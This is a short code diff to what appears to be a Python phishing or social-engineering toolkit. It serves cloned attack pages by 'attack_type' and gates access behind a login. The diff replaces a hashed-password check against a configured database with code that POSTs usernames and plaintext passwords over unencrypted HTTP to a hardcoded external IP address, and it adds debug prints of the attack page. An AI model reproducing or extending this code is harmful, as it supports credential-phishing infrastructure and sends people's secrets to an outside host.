@@ -70,7 +70,9 @@ def attack_url(attack_url):
         u: user_sessen = url_list.get(attack_url)
         r = Response()
         try:
-            r.data = open('modules/socialEngine/'+u.attack_type+"/index.html").read()
+            print('modules/socialEngine/'+u.attack_type+"/index.html")
+            print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
+            r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
             return r
         except:
             return 'the server error'
@@ -123,9 +125,7 @@ def WebClone(attack_url , user , pwd):
     else:
         visit_request[client_ip] = 1
 
-    md5_pwd = hashlib.md5(str(pwd).encode()).hexdigest()
-
-    r = requests.get(config.get('database_adress')+"/?Logon="+user+"?Passwd="+md5_pwd+"?Command=list database")
+    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
     if r.text != 'Passwd Or UserName Error!':
         n = get_random()
         
@@ -153,13 +153,9 @@ def attack(attack_type,user,pwd):
             return 'Too many requests'
     else:
         visit_request[client_ip] = 1
-    
 
-
-    md5_pwd = hashlib.md5(str(pwd).encode()).hexdigest()
-
-    r = requests.get(config.get('database_adress')+"/?Logon="+user+"?Passwd="+md5_pwd+"?Command=list database")
-    if r.text != 'Passwd Or UserName Error!':
+    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
+    if r.text.lower() != 'login failed.':
         n = get_random()
         
         u = user_sessen()
